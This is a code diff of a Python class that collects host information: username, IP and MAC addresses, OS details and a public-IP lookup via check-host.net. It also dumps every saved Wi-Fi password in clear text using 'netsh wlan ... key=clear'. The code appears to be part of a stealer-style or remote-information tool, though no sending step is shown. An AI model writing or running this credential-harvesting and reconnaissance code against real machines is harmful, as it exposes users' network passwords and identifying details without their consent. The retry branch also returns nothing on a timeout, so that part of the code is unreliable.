@@ -5,19 +5,20 @@ import getpass
 import requests
 from datetime import datetime
 from uuid import getnode as get_mac
+
+from bs4 import BeautifulSoup
 from speedtest import Speedtest
 from subprocess import Popen, PIPE, check_output
 
 
 class GetInfo:
     def __init__(self):
-        pass
+        self.__request_count = 0
 
     @staticmethod
     def get_pc_info() -> str:
         username = getpass.getuser()
         ip = socket.gethostbyname(socket.gethostname())
-        pub_ip = requests.get('https://api.ipify.org').text
         mac = get_mac()
         os_info = platform.uname()
         zone = psutil.boot_time()
@@ -26,8 +27,6 @@ class GetInfo:
 
         result = (f"Username: {username}\n"
                   f"local IP address: {ip}\n"
-                  # todo get more information about public IP
-                  f"public IP address: {pub_ip}\n"
                   f"MAC address: {mac}\n"
                   f"Timezone: {os_time.year}/{os_time.month}/{os_time.day}"
                   f" {os_time.hour}:{os_time.minute}:{os_time.second}\n"
@@ -70,7 +69,38 @@ class GetInfo:
             results = check_output(['netsh', 'wlan', 'show', 'profile', wifi, 'key=clear']).decode('cp866').split('\n')
             results = [line.split(':')[1][1:-1] for line in results if "Содержимое ключа" in line]
             try:
-                passwords.append(f'Имя сети: {wifi}, Пароль: {results[0]}')
+                passwords.append(f'Network name: {wifi}, Password: {results[0]}')
             except IndexError:
-                passwords.append(f'Имя сети: {wifi}, Пароль не найден!')
+                passwords.append(f'Network name: {wifi}, Password not found!')
         return "\n".join(passwords)
+
+    @staticmethod
+    def __ip_answer_formatting(ip_info: str) -> str:
+        ip_data_list = list(filter(None, ip_info.split("\n")))
+        ip_data_list.remove("CIDR")
+        answer_list = []
+        for i in range(len(ip_data_list)):
+            if (i + 1) % 2 != 0:
+                answer_list.append(f"{ip_data_list[i]}: ")
+            else:
+                answer_list.append(f"{ip_data_list[i]}\n")
+        return "".join(answer_list)
+
+    def get_pub_ip_info(self) -> str:
+        public_ip = requests.get('https://api.ipify.org').text
+        try:
+            page_response = requests.get(f'https://check-host.net/ip-info?host={public_ip}')
+            if page_response.status_code == 200:
+                page_content = BeautifulSoup(page_response.content, "html.parser")
+                ip_info = page_content.find(class_='inside_info_ipinfo')
+                return self.__ip_answer_formatting(ip_info.text)
+            else:
+                return f"Check permissions, status code: {page_response.status_code}"
+        except requests.Timeout as e:
+            self.__request_count += 1
+            if self.__request_count > 5:
+                return f"Need timeout: {e}"
+            else:
+                self.get_pub_ip_info()
+        except Exception as e:
+            return f"Error: {e}"
